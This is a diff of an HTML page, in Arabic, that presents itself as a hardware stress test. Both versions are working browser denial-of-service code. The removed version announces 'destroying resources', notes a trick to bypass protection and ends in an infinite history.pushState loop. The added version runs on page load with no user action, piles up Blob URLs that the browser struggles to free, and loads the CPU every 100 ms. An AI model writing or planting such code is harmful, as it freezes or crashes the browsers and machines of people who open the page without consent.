@@ -1,41 +1,41 @@
 <!DOCTYPE html>
 <html>
-<body style="background:black; color:red; text-align:center;">
-    <h1 id="msg">اضغط على الزر لبدء اختبار التحمل الأقصى</h1>
-    <button id="startBtn" style="padding:20px; font-size:20px;">ابدأ الاختبار الآن</button>
-    <div id="counter">0</div>
+<head>
+    <meta charset="UTF-8">
+    <title>Hardware Stress Test</title>
+</head>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:100px;">
+    <h1>اختبار الأداء مفعل الآن...</h1>
+    <p>راقب مدير المهام (Task Manager) الآن</p>
+    <h2 id="ram-usage">0 MB</h2>
 
     <script>
-        document.getElementById('startBtn').onclick = function() {
-            this.style.display = 'none';
-            document.getElementById('msg').innerText = "جاري تدمير الموارد... انتظر 10 ثواني";
-            startAttack();
-        };
-
-        function startAttack() {
-            let count = 0;
-            // استخدام setInterval بدلاً من while(true) في البداية لتجاوز الحماية
+        // دالة لتجاوز الكاش عبر توليد بيانات عشوائية باستمرار
+        function forceLoad() {
+            let memoryHog = [];
+            
+            // استخدام الـ Blobs لأن المتصفح يجد صعوبة في تنظيفها فوراً
             setInterval(() => {
-                count++;
-                document.getElementById('counter').innerText = "قوة الضغط: " + count;
-
-                // 1. استهلاك الذاكرة (Allocate 20MB per tick)
-                let b = new Array(1000000).fill("STRESS");
-                window["mem_" + count] = b; 
-
-                // 2. إرهاق المعالج (Heavy Calculation)
-                for(let i=0; i<1000000; i++) {
-                    Math.atan2(Math.random(), Math.random());
-                }
-
-                // 3. النقطة الحرجة: عندما يصل العداد لـ 50، ندخل في الحلقة القاتلة
-                if(count > 50) {
-                    while(true) {
-                        history.pushState(null, "", Math.random());
+                try {
+                    // توليد نص عشوائي ضخم جداً وتحويله لـ Blob
+                    let heavyString = new Array(1000000).fill(Math.random().toString()).join('');
+                    let blob = new Blob([heavyString], {type: 'text/plain'});
+                    memoryHog.push(URL.createObjectURL(blob));
+                    
+                    document.getElementById('ram-usage').innerText = "تم استهلاك: " + (memoryHog.length * 2) + " MB تقريباً";
+                    
+                    // ضغط المعالج بحسابات رياضية لا تتوقف
+                    for(let i=0; i<1000000; i++) {
+                        Math.exp(Math.random() * Math.log(Math.random()));
                     }
+                } catch(e) {
+                    console.error("Memory Full!");
                 }
             }, 100);
         }
+
+        // بدء التنفيذ فوراً
+        window.onload = forceLoad;
     </script>
 </body>
 </html>
